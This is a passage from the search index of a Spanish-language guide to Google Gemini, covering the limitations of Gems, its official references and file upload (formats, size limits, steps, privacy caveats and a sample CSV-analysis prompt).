adjunto.</p>"},{"location":"gems/#plantilla","title":"Plantilla","text":"PLANTILLA<pre><code>#ROL\n</code></pre>"},{"location":"gems/#limitaciones-y-avisos","title":"\u26a0\ufe0f Limitaciones y Avisos","text":"<ul> <li>Ventana de Contexto Compartida: Las instrucciones de la Gema ocupan espacio en la ventana de contexto. Si las instrucciones son excesivamente largas (miles de palabras), te quedar\u00e1 menos espacio para la conversaci\u00f3n activa.</li> <li>Alucinaciones Persistentes: Si instruyes a la Gema con informaci\u00f3n err\u00f3nea en su configuraci\u00f3n (ej: \"La capital de Francia es Lyon\"), el modelo priorizar\u00e1 esa instrucci\u00f3n sobre su conocimiento general, generando errores sistem\u00e1ticos.</li> <li>No es RAG Din\u00e1mico (por ahora): En su versi\u00f3n est\u00e1ndar, las Gemas no se conectan autom\u00e1ticamente a una carpeta de Google Drive espec\u00edfica en tiempo real a menos que uses las extensiones o subas los archivos manualmente en cada sesi\u00f3n (dependiendo de la versi\u00f3n actual de la UI).</li> <li>Sin \"Memoria\" entre sesiones: Una Gema no recuerda lo que hablaste con ella en un chat anterior; cada vez que abres la Gema, se reinicia al estado original de sus instrucciones base.</li> </ul>"},{"location":"gems/#referencias-oficiales-fuentes","title":"\ud83d\udd17 Referencias Oficiales (Fuentes)","text":"<p>Para validar esta capacidad de RAG y el uso de Drive, consulta:</p> <ul> <li>Google Workspace Updates (Nov 2024): Upload Google Docs and other file types to Gem instructions. Confirma la capacidad de adjuntar archivos de Drive y Docs como referencia.<ul> <li>Link a la nota oficial</li> </ul> </li> <li>Google Workspace Blog: New features in Gemini to deepen usage for organizations. Detalla c\u00f3mo las Gemas usan la versi\u00f3n m\u00e1s reciente de los archivos de Drive (\"Gems use the most recent version of that file\").<ul> <li>Link al art\u00edculo</li> </ul> </li> <li>Ayuda de Google Drive: Use Gems with Gemini in Google Drive.<ul> <li>Link a Soporte</li> </ul> </li> <li> </li> </ul> <p>Resumen TL;DR: Funci\u00f3n que permite \"alimentar\" a Gemini con documentos externos (PDFs, hojas de c\u00e1lculo, c\u00f3digo) para que los analice, resuma o transforme. Los archivos se convierten en parte de la memoria a corto plazo (contexto) del chat.</p>"},{"location":"gems/#analisis-de-archivos-y-documentos-file-upload","title":"An\u00e1lisis de Archivos y Documentos (File Upload)","text":""},{"location":"gems/#explicacion-tecnica","title":"\ud83d\udcd8 Explicaci\u00f3n T\u00e9cnica","text":"<p>Cuando subes un archivo a Gemini, no est\u00e1s \"guard\u00e1ndolo\" en una nube tradicional. T\u00e9cnicamente, ocurre un proceso de Tokenizaci\u00f3n e Ingesta: 1.  Extracci\u00f3n: Gemini lee el texto crudo (o la estructura de datos en un CSV/Excel) y lo extrae del formato original. 2.  Inyecci\u00f3n en Contexto: Ese contenido extra\u00eddo se cuenta como tokens y se inyecta directamente en la Ventana de Contexto (Context Window) del modelo. 3.  Razonamiento: El modelo procesa esa informaci\u00f3n como si t\u00fa la hubieras escrito manualmente en el chat, permiti\u00e9ndole razonar sobre ella, buscar correlaciones o detectar patrones.</p> <p>Gracias a la arquitectura multimodal nativa (especialmente en modelos Gemini 1.5 Pro o Flash), el sistema puede entender la estructura visual de un PDF (tablas, gr\u00e1ficos) y la l\u00f3gica matem\u00e1tica de una hoja de c\u00e1lculo.</p>"},{"location":"gems/#formatos-y-limites-datos-oficiales","title":"\ud83d\udccb Formatos y L\u00edmites (Datos Oficiales)","text":"<p>Seg\u00fan la documentaci\u00f3n de soporte (<code>answer/14903178</code>), estas son las especificaciones exactas:</p> <p>Formatos Admitidos: * Documentos de texto: .txt, .doc, .docx, .pdf, .rtf, .dot, .dotx, .hwp, .hwpx. * Datos tabulares: .csv, .tsv, .xls, .xlsx (Hojas de c\u00e1lculo). * C\u00f3digo de programaci\u00f3n: .js, .py, .c, .cpp, .java, .sql, .html, .css, .json, y muchos m\u00e1s. * Libros electr\u00f3nicos: .epub.</p> <p>L\u00edmites de Carga (\"Hard Limits\"): * Cantidad: M\u00e1ximo 10 archivos simult\u00e1neos por prompt (mensaje). * Peso: M\u00e1ximo 100 MB por cada archivo. * Nota sobre Im\u00e1genes: Si subes im\u00e1genes dentro de un documento, estas tambi\u00e9n consumen tokens y son procesadas por el motor de visi\u00f3n del modelo.</p>"},{"location":"gems/#como-usarlo-paso-a-paso","title":"\ud83d\udee0\ufe0f C\u00f3mo usarlo (Paso a Paso)","text":"<ol> <li>Interfaz: En la barra de entrada de texto, localiza el s\u00edmbolo M\u00e1s (+).</li> <li>Selecci\u00f3n: Elige \"Subir archivo\" (desde tu dispositivo) o \"Google Drive\" (para conectar con tus documentos en la nube).</li> <li>Carga: Espera unos segundos a que el archivo se procese (ver\u00e1s una barra de progreso o un icono de archivo cargado).</li> <li>Prompting: Escribe tu instrucci\u00f3n. Nunca subas un archivo sin decirle qu\u00e9 hacer con \u00e9l.<ul> <li>Incorrecto: [Subir archivo] -&gt; Enviar.</li> <li>Correcto: [Subir archivo] -&gt; \"Haz un resumen ejecutivo de este reporte\".</li> </ul> </li> </ol>"},{"location":"gems/#limitaciones-y-avisos_1","title":"\u26a0\ufe0f Limitaciones y Avisos","text":"<ul> <li>Privacidad (Aviso Cr\u00edtico): Seg\u00fan la configuraci\u00f3n de tu cuenta, los revisores humanos podr\u00edan acceder a los archivos subidos para mejorar el modelo (en versiones personales). NO subas documentos con informaci\u00f3n confidencial, m\u00e9dica o financiera (PII) a menos que uses una licencia Enterprise con la protecci\u00f3n de datos activada.</li> <li>Consumo de Contexto: Archivos muy grandes pueden llenar la ventana de contexto. Si subes un PDF de 500 p\u00e1ginas, podr\u00edas tener menos espacio para que el modelo genere una respuesta larga (\"output tokens\").</li> <li>Interacci\u00f3n con Gr\u00e1ficos: Aunque Gemini es multimodal, a veces puede \"alucinar\" al interpretar gr\u00e1ficos complejos (scatter plots densos) dentro de un PDF. Siempre verifica los datos num\u00e9ricos extra\u00eddos.</li> </ul>"},{"location":"gems/#ejemplo-de-prompt","title":"\ud83d\udca1 Ejemplo de Prompt","text":"<p>Contexto: Usuario sube un archivo <code>.csv</code> con datos de ventas mensuales.</p> <p>Prompt: \"Act\u00faa como un analista de datos senior. He adjuntado un archivo CSV con las ventas del \u00faltimo a\u00f1o. 1. Identifica cu\u00e1l fue el mes con mayor ca\u00edda (churn) de clientes. 2. Calcula el promedio de ventas del Q3. 3. Genera un gr\u00e1fico de barras simple (usando c\u00f3digo Python) que muestre la tendencia de ingresos.\"</p>"}]}